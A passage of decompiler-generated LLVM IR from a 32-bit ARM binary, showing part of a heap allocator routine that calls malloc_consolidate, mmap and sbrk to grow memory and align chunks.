  br i1 %v3_15e24, label %dec_label_pc_15e54, label %dec_label_pc_15e30

dec_label_pc_15e30:                               ; preds = %dec_label_pc_15e08
  %v2_15e30 = sub i32 %v1_15e20, %v0_15e1c
  %v2_15e34 = add i32 %v0_15e1c, %v3_15e14
  store i32 %v2_15e34, i32* %r1.global-to-local, align 4
  %v1_15e38 = or i32 %v2_15e30, 1
  store i32 %v1_15e38, i32* %r3.global-to-local, align 4
  %v1_15e3c = or i32 %v0_15e1c, 1
  store i32 %v1_15e3c, i32* %r2.global-to-local, align 4
  %v1_15e40 = add i32 %v3_15e14, 8
  store i32 %v1_15e40, i32* %r4.global-to-local, align 4
  store i32 %v1_15e3c, i32* %v2_15e18, align 4
  %v0_15e48 = load i32, i32* %r1.global-to-local, align 4
  %v1_15e48 = load i32, i32* @r0, align 4
  %v2_15e48 = add i32 %v1_15e48, 44
  %v3_15e48 = inttoptr i32 %v2_15e48 to i32*
  store i32 %v0_15e48, i32* %v3_15e48, align 4
  %v0_15e4c = load i32, i32* %r3.global-to-local, align 4
  %v1_15e4c = load i32, i32* %r1.global-to-local, align 4
  %v2_15e4c = add i32 %v1_15e4c, 4
  %v3_15e4c = inttoptr i32 %v2_15e4c to i32*
  store i32 %v0_15e4c, i32* %v3_15e4c, align 4
  br label %dec_label_pc_16254

dec_label_pc_15e54:                               ; preds = %dec_label_pc_15e08
  %v1_15e54 = inttoptr i32 %v4_15e10 to i32*
  %v2_15e54 = load i32, i32* %v1_15e54, align 4
  store i32 %v2_15e54, i32* %r3.global-to-local, align 4
  %v1_15e58 = and i32 %v2_15e54, 2
  store i32 %v1_15e58, i32* %ip.global-to-local, align 4
  %v2_15e58 = icmp eq i32 %v1_15e58, 0
  %v1_15e5c = add i32 %v4_15e10, 860
  %v2_15e5c = inttoptr i32 %v1_15e5c to i32*
  %v3_15e5c = load i32, i32* %v2_15e5c, align 4
  store i32 %v3_15e5c, i32* %r1.global-to-local, align 4
  br i1 %v2_15e58, label %dec_label_pc_15e74, label %dec_label_pc_15e64

dec_label_pc_15e64:                               ; preds = %dec_label_pc_15e54
  %v0_15e64 = call i32 @__malloc_consolidate()
  %v0_15e68 = load i32, i32* @sl, align 4
  %v1_15e68 = add i32 %v0_15e68, -7
  store i32 %v1_15e68, i32* %r0.global-to-local, align 4
  %v1_15e6c = call i32 @malloc(i32 %v1_15e68)
  store i32 %v1_15e6c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16250

dec_label_pc_15e74:                               ; preds = %dec_label_pc_15e54
  %v1_15e74 = add i32 %v4_15e10, 844
  %v2_15e74 = inttoptr i32 %v1_15e74 to i32*
  %v3_15e74 = load i32, i32* %v2_15e74, align 4
  store i32 %v3_15e74, i32* %r3.global-to-local, align 4
  %v3_15e78 = icmp ult i32 %v0_15e1c, %v3_15e74
  %v1_15e7c = add i32 %v3_15e5c, -1
  store i32 %v1_15e7c, i32* %sb.global-to-local, align 4
  br i1 %v3_15e78, label %dec_label_pc_15f50, label %dec_label_pc_15e84

dec_label_pc_15e84:                               ; preds = %dec_label_pc_15e74
  %v1_15e84 = add i32 %v4_15e10, 852
  %v2_15e84 = inttoptr i32 %v1_15e84 to i32*
  %v3_15e84 = load i32, i32* %v2_15e84, align 4
  store i32 %v3_15e84, i32* %r2.global-to-local, align 4
  %v1_15e88 = add i32 %v4_15e10, 848
  %v2_15e88 = inttoptr i32 %v1_15e88 to i32*
  %v3_15e88 = load i32, i32* %v2_15e88, align 4
  store i32 %v3_15e88, i32* %r3.global-to-local, align 4
  %v6_15e90 = icmp slt i32 %v3_15e88, %v3_15e84
  br i1 %v6_15e90, label %dec_label_pc_15e94, label %dec_label_pc_15f50

dec_label_pc_15e94:                               ; preds = %dec_label_pc_15e84
  %v1_15e94 = add i32 %v0_15e1c, 10
  %v2_15e98 = add i32 %v1_15e94, %v3_15e5c
  store i32 %v2_15e98, i32* %r3.global-to-local, align 4
  %v2_15e9c = sub i32 0, %v3_15e5c
  %v3_15e9c = and i32 %v2_15e98, %v2_15e9c
  store i32 %v3_15e9c, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_15e9c, %v0_15e1c
  br i1 %tmp211, label %dec_label_pc_15ea8, label %dec_label_pc_15f50

dec_label_pc_15ea8:                               ; preds = %dec_label_pc_15e94
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_15e9c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_15ec0 = call i32 @mmap(i32 0, i32 %v3_15e9c, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_15ec0, i32* %r0.global-to-local, align 4
  %v7_15ec4 = icmp eq i32 %v6_15ec0, -1
  br i1 %v7_15ec4, label %dec_label_pc_15ea8.dec_label_pc_15f50_crit_edge, label %dec_label_pc_15ecc

dec_label_pc_15ea8.dec_label_pc_15f50_crit_edge:  ; preds = %dec_label_pc_15ea8
  %v1_15f74.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_15f50

dec_label_pc_15ecc:                               ; preds = %dec_label_pc_15ea8
  %v1_15ecc = urem i32 %v6_15ec0, 8
  store i32 %v1_15ecc, i32* %r2.global-to-local, align 4
  %v2_15ecc = icmp eq i32 %v1_15ecc, 0
  br i1 %v2_15ecc, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_15ecc
  %v2_15ed0 = sub nsw i32 8, %v1_15ecc
  store i32 %v2_15ed0, i32* %r3.global-to-local, align 4
  %v2_15ed4 = load i32, i32* @r4, align 4
  %v3_15ed4 = sub i32 %v2_15ed4, %v2_15ed0
  %v3_15ed8 = add i32 %v2_15ed0, %v6_15ec0
  store i32 %v3_15ed8, i32* %lr.global-to-local, align 4
  %v2_15ee0 = or i32 %v3_15ed4, 2
  store i32 %v2_15ee0, i32* %r2.global-to-local, align 4
  %v5_15ee8 = inttoptr i32 %v3_15ed8 to i32*
  store i32 %v2_15ed0, i32* %v5_15ee8, align 4
  %v1_15eec = load i32, i32* %r2.global-to-local, align 4
  %v2_15eec = load i32, i32* %lr.global-to-local, align 4
  %v3_15eec = add i32 %v2_15eec, 4
  %v4_15eec = inttoptr i32 %v3_15eec to i32*
  store i32 %v1_15eec, i32* %v4_15eec, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_15ecc
  store i32 %v6_15ec0, i32* %lr.global-to-local, align 4
  %v1_15ee447 = load i32, i32* @r4, align 4
  %v2_15ee448 = or i32 %v1_15ee447, 2
  store i32 %v2_15ee448, i32* %r3.global-to-local, align 4
  %v3_15ef0 = inttoptr i32 %v6_15ec0 to i32*
  store i32 0, i32* %v3_15ef0, align 4
  %v1_15ef4 = load i32, i32* %r3.global-to-local, align 4
  %v2_15ef4 = load i32, i32* %lr.global-to-local, align 4
  %v3_15ef4 = add i32 %v2_15ef4, 4
  %v4_15ef4 = inttoptr i32 %v3_15ef4 to i32*
  store i32 %v1_15ef4, i32* %v4_15ef4, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_15f00 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 32) to i32*), align 4
  store i32 %v4_15f00, i32* %ip.global-to-local, align 4
  %v1_15f04 = add i32 %v4_15f00, 848
  %v2_15f04 = inttoptr i32 %v1_15f04 to i32*
  %v3_15f04 = load i32, i32* %v2_15f04, align 4
  store i32 %v3_15f04, i32* %r3.global-to-local, align 4
  %v1_15f08 = add i32 %v4_15f00, 856
  %v2_15f08 = inttoptr i32 %v1_15f08 to i32*
  %v3_15f08 = load i32, i32* %v2_15f08, align 4
  store i32 %v3_15f08, i32* %r2.global-to-local, align 4
  %v1_15f0c = add i32 %v3_15f04, 1
  store i32 %v1_15f0c, i32* %r3.global-to-local, align 4
  %v7_15f14 = icmp sgt i32 %v1_15f0c, %v3_15f08
  br i1 %v7_15f14, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_15f0c, i32* %v2_15f08, align 4
  %v0_15f18.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_15f18.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_15f18 = phi i32 [ %v4_15f00, %.thread27 ], [ %v1_15f18.pre, %bb147 ]
  %v0_15f18 = phi i32 [ %v1_15f0c, %.thread27 ], [ %v0_15f18.pre, %bb147 ]
  %v2_15f18 = add i32 %v1_15f18, 848
  %v3_15f18 = inttoptr i32 %v2_15f18 to i32*
  store i32 %v0_15f18, i32* %v3_15f18, align 4
  %v0_15f1c = load i32, i32* %ip.global-to-local, align 4
  %v1_15f1c = add i32 %v0_15f1c, 868
  %v2_15f1c = inttoptr i32 %v1_15f1c to i32*
  %v3_15f1c = load i32, i32* %v2_15f1c, align 4
  store i32 %v3_15f1c, i32* %r3.global-to-local, align 4
  %v1_15f20 = add i32 %v0_15f1c, 880
  %v2_15f20 = inttoptr i32 %v1_15f20 to i32*
  %v3_15f20 = load i32, i32* %v2_15f20, align 4
  store i32 %v3_15f20, i32* %r2.global-to-local, align 4
  %v0_15f24 = load i32, i32* @r4, align 4
  %v2_15f24 = add i32 %v0_15f24, %v3_15f1c
  store i32 %v2_15f24, i32* %r1.global-to-local, align 4
  %v1_15f28 = add i32 %v0_15f1c, 872
  %v2_15f28 = inttoptr i32 %v1_15f28 to i32*
  %v3_15f28 = load i32, i32* %v2_15f28, align 4
  store i32 %v3_15f28, i32* %r3.global-to-local, align 4
  %v1_15f30 = add i32 %v0_15f1c, 884
  %v2_15f30 = inttoptr i32 %v1_15f30 to i32*
  %v3_15f30 = load i32, i32* %v2_15f30, align 4
  store i32 %v3_15f30, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_15f24, %v3_15f20
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_15f24, i32* %v2_15f20, align 4
  %v0_15f38.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_15f38.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_15f38 = phi i32 [ %v0_15f1c, %bb148 ], [ %v1_15f38.pre, %bb149 ]
  %v0_15f38 = phi i32 [ %v2_15f24, %bb148 ], [ %v0_15f38.pre, %bb149 ]
  %v2_15f38 = add i32 %v1_15f38, 868
  %v3_15f38 = inttoptr i32 %v2_15f38 to i32*
  store i32 %v0_15f38, i32* %v3_15f38, align 4
  %v0_15f3c = load i32, i32* %r1.global-to-local, align 4
  %v1_15f3c = load i32, i32* %r3.global-to-local, align 4
  %v2_15f3c = add i32 %v1_15f3c, %v0_15f3c
  store i32 %v2_15f3c, i32* %r1.global-to-local, align 4
  %v1_15f40 = load i32, i32* %r2.global-to-local, align 4
  %v0_15f44 = load i32, i32* %lr.global-to-local, align 4
  %v1_15f44 = add i32 %v0_15f44, 8
  store i32 %v1_15f44, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_15f3c, %v1_15f40
  br i1 %tmp213, label %bb151, label %dec_label_pc_16250

bb151:                                            ; preds = %bb150
  %v5_15f48 = load i32, i32* %ip.global-to-local, align 4
  %v6_15f48 = add i32 %v5_15f48, 884
  %v7_15f48 = inttoptr i32 %v6_15f48 to i32*
  store i32 %v2_15f3c, i32* %v7_15f48, align 4
  br label %dec_label_pc_16250

dec_label_pc_15f50:                               ; preds = %dec_label_pc_15e94, %dec_label_pc_15e74, %dec_label_pc_15ea8.dec_label_pc_15f50_crit_edge, %dec_label_pc_15e84
  %v1_15f74 = phi i32 [ %v1_15f74.pre, %dec_label_pc_15ea8.dec_label_pc_15f50_crit_edge ], [ %v0_15e1c, %dec_label_pc_15e84 ], [ %v0_15e1c, %dec_label_pc_15e74 ], [ %v0_15e1c, %dec_label_pc_15e94 ]
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %ip.global-to-local, align 4
  %v4_15f58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 32) to i32*), align 4
  store i32 %v4_15f58, i32* %r3.global-to-local, align 4
  %v1_15f5c = add i32 %v4_15f58, 44
  %v2_15f5c = inttoptr i32 %v1_15f5c to i32*
  %v3_15f5c = load i32, i32* %v2_15f5c, align 4
  store i32 %v3_15f5c, i32* %r0.global-to-local, align 4
  %v1_15f60 = add i32 %v4_15f58, 864
  %v2_15f60 = inttoptr i32 %v1_15f60 to i32*
  %v3_15f60 = load i32, i32* %v2_15f60, align 4
  store i32 %v3_15f60, i32* %r2.global-to-local, align 4
  %v1_15f64 = add i32 %v4_15f58, 840
  %v2_15f64 = inttoptr i32 %v1_15f64 to i32*
  %v3_15f64 = load i32, i32* %v2_15f64, align 4
  store i32 %v3_15f64, i32* %r3.global-to-local, align 4
  %v1_15f68 = add i32 %v3_15f5c, 4
  %v2_15f68 = inttoptr i32 %v1_15f68 to i32*
  %v3_15f68 = load i32, i32* %v2_15f68, align 4
  store i32 %v3_15f68, i32* %r1.global-to-local, align 4
  %v1_15f70 = urem i32 %v3_15f60, 2
  %v2_15f70 = icmp eq i32 %v1_15f70, 0
  %v1_15f6c = add i32 %v1_15f74, 16
  %v2_15f74 = add i32 %v1_15f6c, %v3_15f64
  store i32 %v2_15f74, i32* %r3.global-to-local, align 4
  %v1_15f78 = and i32 %v3_15f68, -4
  store i32 %v1_15f78, i32* @r8, align 4
  br i1 %v2_15f70, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_15f50
  %v3_15f7c = sub i32 %v2_15f74, %v1_15f78
  store i32 %v3_15f7c, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_15f50, %bb152
  %v0_15f80 = phi i32 [ %v2_15f74, %dec_label_pc_15f50 ], [ %v3_15f7c, %bb152 ]
  %v1_15f80 = load i32, i32* %sb.global-to-local, align 4
  %v2_15f80 = add i32 %v1_15f80, %v0_15f80
  store i32 %v2_15f80, i32* %r3.global-to-local, align 4
  %v1_15f84 = sub i32 -1, %v1_15f80
  store i32 %v1_15f84, i32* %fp.global-to-local, align 4
  %v2_15f88 = and i32 %v2_15f80, %v1_15f84
  store i32 %v2_15f88, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_15f88, 1
  br i1 %tmp154, label %dec_label_pc_15fac, label %dec_label_pc_15f98

dec_label_pc_15f98:                               ; preds = %bb153
  store i32 %v2_15f88, i32* %r0.global-to-local, align 4
  %v1_15f9c = call i32 @__GI_sbrk(i32 %v2_15f88)
  store i32 %v1_15f9c, i32* %r0.global-to-local, align 4
  %v3_15fa0 = icmp eq i32 %v1_15f9c, -1
  store i32 %v1_15f9c, i32* @r4, align 4
  br i1 %v3_15fa0, label %dec_label_pc_15fac, label %dec_label_pc_16018

dec_label_pc_15fac:                               ; preds = %dec_label_pc_15f98, %bb153
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r1.global-to-local, align 4
  %v4_15fb4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 32) to i32*), align 4
  store i32 %v4_15fb4, i32* %r6.global-to-local, align 4
  %v1_15fb8 = add i32 %v4_15fb4, 864
  %v2_15fb8 = inttoptr i32 %v1_15fb8 to i32*
  %v3_15fb8 = load i32, i32* %v2_15fb8, align 4
  store i32 %v3_15fb8, i32* %r3.global-to-local, align 4
  %v1_15fbc = urem i32 %v3_15fb8, 2
  %v2_15fbc = icmp eq i32 %v1_15fbc, 0
  br i1 %v2_15fbc, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_15fac
  %v1_15fc0 = load i32, i32* @r8, align 4
  %v2_15fc0 = load i32, i32* %sb.global-to-local, align 4
  %v3_15fc0 = add i32 %v2_15fc0, %v1_15fc0
  %v2_15fc4 = load i32, i32* @r5, align 4
  %v3_15fc4 = add i32 %v3_15fc0, %v2_15fc4
  store i32 %v3_15fc4, i32* %r3.global-to-local, align 4
  %v2_15fc8 = load i32, i32* %fp.global-to-local, align 4
  %v3_15fc8 = and i32 %v2_15fc8, %v3_15fc4
  store i32 %v3_15fc8, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_15fac
  %v0_15fcc.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_15fcc = phi i32 [ %v0_15fcc.pr, %.thread29thread-pre-split ], [ %v3_15fc8, %bb155 ]
  %v2_15fcc = icmp ugt i32 %v0_15fcc, 1048575
  br i1 %v2_15fcc, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_15fe4 = phi i32 [ %v0_15fcc, %.thread29 ], [ 1048576, %bb156 ]
  %v1_15fd4 = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_15fe4, %v1_15fd4
  br i1 %tmp214, label %dec_label_pc_15fdc, label %dec_label_pc_16240

dec_label_pc_15fdc:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_15fe4, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_15ff8 = call i32 @mmap(i32 0, i32 %v0_15fe4, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_15ff8, i32* %r0.global-to-local, align 4
  %v3_15ffc = icmp eq i32 %v6_15ff8, -1
  %v8_15ffc = icmp eq i32 %v6_15ff8, -1
  store i32 %v6_15ff8, i32* @r4, align 4
  br i1 %v8_15ffc, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_15fdc
  %v1_16004 = load i32, i32* %r6.global-to-local, align 4
  %v2_16004 = add i32 %v1_16004, 864
  %v3_16004 = inttoptr i32 %v2_16004 to i32*
  %v4_16004 = load i32, i32* %v3_16004, align 4
  %v2_16008 = load i32, i32* @r5, align 4
  %v3_16008 = add i32 %v2_16008, %v6_15ff8
  store i32 %v3_16008, i32* %r0.global-to-local, align 4
  %v2_1600c = and i32 %v4_16004, -2
  store i32 %v2_1600c, i32* %r3.global-to-local, align 4
  store i32 %v2_1600c, i32* %v3_16004, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_15fdc, %bb158
  br i1 %v3_15ffc, label %dec_label_pc_16018, label %dec_label_pc_1601c

dec_label_pc_16018:                               ; preds = %.thread32, %dec_label_pc_15f98
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1601c

dec_label_pc_1601c:                               ; preds = %.thread32, %dec_label_pc_16018
  %v0_1601c = load i32, i32* @r4, align 4
  %v7_1601c = icmp eq i32 %v0_1601c, -1
  br i1 %v7_1601c, label %dec_label_pc_16240, label %dec_label_pc_16024

dec_label_pc_16024:                               ; preds = %dec_label_pc_1601c
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r2.global-to-local, align 4
  %v4_1602c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 32) to i32*), align 4
  store i32 %v4_1602c, i32* %ip.global-to-local, align 4
  store i32 %v3_15f5c, i32* %r2.global-to-local, align 4
  %v1_16034 = add i32 %v4_1602c, 872
  %v2_16034 = inttoptr i32 %v1_16034 to i32*
  %v3_16034 = load i32, i32* %v2_16034, align 4
  %v1_16038 = load i32, i32* @r8, align 4
  %v2_16038 = add i32 %v1_16038, %v3_15f5c
  store i32 %v2_16038, i32* %r1.global-to-local, align 4
  %v0_1603c = load i32, i32* @r5, align 4
  %v2_1603c = add i32 %v0_1603c, %v3_16034
  store i32 %v2_1603c, i32* %r3.global-to-local, align 4
  %v9_16040 = icmp eq i32 %v0_1601c, %v2_16038
  br i1 %v9_16040, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_16024
  store i32 %v2_1603c, i32* %v2_16034, align 4
  br label %dec_label_pc_1605c

bb159:                                            ; preds = %dec_label_pc_16024
  %v1_16044 = load i32, i32* %r0.global-to-local, align 4
  %v8_16044 = icmp eq i32 %v1_16044, -1
  store i32 %v2_1603c, i32* %v2_16034, align 4
  br i1 %v8_16044, label %.thread34, label %dec_label_pc_1605c

.thread34:                                        ; preds = %bb159
  %v1_1604c = load i32, i32* @r5, align 4
  %v2_1604c = load i32, i32* @r8, align 4
  %v3_1604c = add i32 %v2_1604c, %v1_1604c
  %v2_16050 = or i32 %v3_1604c, 1
  store i32 %v2_16050, i32* %r3.global-to-local, align 4
  %v2_16054 = load i32, i32* %r2.global-to-local, align 4
  %v3_16054 = add i32 %v2_16054, 4
  %v4_16054 = inttoptr i32 %v3_16054 to i32*
  store i32 %v2_16050, i32* %v4_16054, align 4
  br label %dec_label_pc_161d4

dec_label_pc_1605c:                               ; preds = %bb159, %.thread122
  %v0_16060.pr = load i32, i32* @r8, align 4
  %v0_1605c = load i32, i32* %ip.global-to-local, align 4
  %v1_1605c = add i32 %v0_1605c, 864
  %v2_1605c = inttoptr i32 %v1_1605c to i32*
  %v3_1605c = load i32, i32* %v2_1605c, align 4
  store i32 %v3_1605c, i32* %r2.global-to-local, align 4
  %v2_16060 = icmp eq i32 %v0_16060.pr, 0
  br i1 %v2_16060, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_1605c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_1605c
  %v2_16068 = urem i32 %v3_1605c, 2
  store i32 %v2_16068, i32* %r3.global-to-local, align 4
  %v2_1606c = icmp eq i32 %v2_16068, 0
  br i1 %v2_1606c, label %.thread40, label %dec_label_pc_16074

dec_label_pc_16074:                               ; preds = %.thread36
  %v0_16074 = load i32, i32* @r4, align 4
  %v1_16074 = load i32, i32* %r1.global-to-local, align 4
  %v3_16074 = icmp ult i32 %v0_16074, %v1_16074
  br i1 %v3_16074, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_16074
  %v2_16078 = and i32 %v3_1605c, -2
  store i32 %v2_16078, i32* %r3.global-to-local, align 4
  store i32 %v2_16078, i32* %v2_1605c, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_16074, %.thread37, %.thread36, %bb160
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %ip.global-to-local, align 4
  %v4_16088 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 32) to i32*), align 4
  store i32 %v4_16088, i32* @r7, align 4
  %v1_1608c = add i32 %v4_16088, 864
  %v2_1608c = inttoptr i32 %v1_1608c to i32*
  %v3_1608c = load i32, i32* %v2_1608c, align 4
  store i32 %v3_1608c, i32* %r3.global-to-local, align 4
  %v1_16090 = urem i32 %v3_1608c, 2
  store i32 %v1_16090, i32* @r6, align 4
  %v2_16090 = icmp eq i32 %v1_16090, 0
  br i1 %v2_16090, label %dec_label_pc_16124, label %dec_label_pc_16098

dec_label_pc_16098:                               ; preds = %.thread40
  %v0_16098 = load i32, i32* @r8, align 4
  %v2_16098 = icmp eq i32 %v0_16098, 0
  br i1 %v2_16098, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_16098
  %v2_1609c = add i32 %v4_16088, 872
  %v3_1609c = inttoptr i32 %v2_1609c to i32*
  %v4_1609c = load i32, i32* %v3_1609c, align 4
  store i32 %v4_1609c, i32* %r2.global-to-local, align 4
  %v1_160a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_160a0 = load i32, i32* @r4, align 4
  %v3_160a0 = sub i32 %v2_160a0, %v1_160a0
  %v3_160a4 = add i32 %v3_160a0, %v4_1609c
  store i32 %v3_160a4, i32* %r3.global-to-local, align 4
  store i32 %v3_160a4, i32* %v3_1609c, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_16098, %bb161
  %v0_160ac = load i32, i32* @r4, align 4
  %v1_160ac = urem i32 %v0_160ac, 8
  store i32 %v1_160ac, i32* %r3.global-to-local, align 4
  %v2_160ac = icmp eq i32 %v1_160ac, 0
  br i1 %v2_160ac, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_160b0 = sub nsw i32 8, %v1_160ac
  store i32 %v2_160b0, i32* %r3.global-to-local, align 4
  %v3_160b4 = add i32 %v2_160b0, %v0_160ac
  store i32 %v3_160b4, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_160bc = phi i32 [ 0, %.thread43 ], [ %v2_160b0, %bb162 ]
  %v1_160b8 = load i32, i32* @r5, align 4
  %v2_160b8 = add i32 %v1_160b8, %v0_160ac
  store i32 %v2_160b8, i32* @r6, align 4
  %v1_160bc = load i32, i32* @r8, align 4
  %v2_160bc = add i32 %v2_160b8, %v0_160bc
  %v2_160c0 = add i32 %v2_160bc, %v1_160bc
  store i32 %v2_160c0, i32* %r1.global-to-local, align 4
  %v1_160c4 = load i32, i32* %sb.global-to-local, align 4
  %v2_160c4 = add i32 %v1_160c4, %v2_160c0
  %v1_160c8 = load i32, i32* %fp.global-to-local, align 4
  %v2_160c8 = and i32 %v1_160c8, %v2_160c4
  store i32 %v2_160c8, i32* %r2.global-to-local, align 4
  %v2_160cc = sub i32 0, %v2_160b8
  store i32 %v2_160cc, i32* %r3.global-to-local, align 4
  %v2_160d0 = sub i32 %v2_160c8, %v2_160b8
  store i32 %v2_160d0, i32* @r5, align 4
  store i32 %v2_160d0, i32* %r0.global-to-local, align 4
  br i1 %v2_160ac, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_160ac, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_160dc = call i32 @__GI_sbrk(i32 %v2_160d0)
  store i32 %v1_160dc, i32* %r0.global-to-local, align 4
  %v3_160e0 = icmp eq i32 %v1_160dc, -1
  br i1 %v3_160e0, label %dec_label_pc_160e8, label %dec_label_pc_160f8

dec_label_pc_160e8:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_160ec = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_160ec, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_16150

dec_label_pc_160f8:                               ; preds = %bb164
  %v1_160f8 = load i32, i32* @r4, align 4
  %v3_160f8 = icmp ult i32 %v1_160dc, %v1_160f8
  br i1 %v3_160f8, label %dec_label_pc_16100, label %dec_label_pc_16150

dec_label_pc_16100:                               ; preds = %dec_label_pc_160f8
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r0.global-to-local, align 4
  %v4_16108 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 32) to i32*), align 4
  store i32 %v4_16108, i32* %r2.global-to-local, align 4
  %v1_1610c = add i32 %v4_16108, 864
  %v2_1610c = inttoptr i32 %v1_1610c to i32*
  %v3_1610c = load i32, i32* %v2_1610c, align 4
  %v0_16110 = load i32, i32* @r6, align 4
  store i32 %v0_16110, i32* %r0.global-to-local, align 4
  %v1_16114 = and i32 %v3_1610c, -2
  store i32 %v1_16114, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_16114, i32* %v2_1610c, align 4
  br label %dec_label_pc_16150

dec_label_pc_16124:                               ; preds = %.thread40
  %v0_16124 = load i32, i32* %r0.global-to-local, align 4
  %v3_16124 = icmp eq i32 %v0_16124, -1
  br i1 %v3_16124, label %dec_label_pc_1612c, label %dec_label_pc_16148

dec_label_pc_1612c:                               ; preds = %dec_label_pc_16124
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_16130 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_16130, i32* %r0.global-to-local, align 4
  %v0_16134 = load i32, i32* @r7, align 4
  %v1_16134 = add i32 %v0_16134, 872
  %v2_16134 = inttoptr i32 %v1_16134 to i32*
  %v3_16134 = load i32, i32* %v2_16134, align 4
  store i32 %v3_16134, i32* %r2.global-to-local, align 4
  %v0_16138 = load i32, i32* @r4, align 4
  %v0_1613c = load i32, i32* @r5, align 4
  %v2_16138 = add i32 %v3_16134, %v1_16130
  %v2_1613c = sub i32 %v2_16138, %v0_16138
  %v2_16140 = sub i32 %v2_1613c, %v0_1613c
  store i32 %v2_16140, i32* %r3.global-to-local, align 4
  store i32 %v2_16140, i32* %v2_16134, align 4
  %v0_1614c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16148

dec_label_pc_16148:                               ; preds = %dec_label_pc_16124, %dec_label_pc_1612c
  %v0_1614c = phi i32 [ 0, %dec_label_pc_16124 ], [ %v0_1614c.pre, %dec_label_pc_1612c ]
  %v0_16148 = load i32, i32* @r4, align 4
  store i32 %v0_16148, i32* @r7, align 4
  store i32 %v0_1614c, i32* @r5, align 4
  br label %dec_label_pc_16150

dec_label_pc_16150:                               ; preds = %dec_label_pc_160f8, %dec_label_pc_16100, %dec_label_pc_160e8, %dec_label_pc_16148
  %v0_16150 = load i32, i32* %r0.global-to-local, align 4
  %v7_16150 = icmp eq i32 %v0_16150, -1
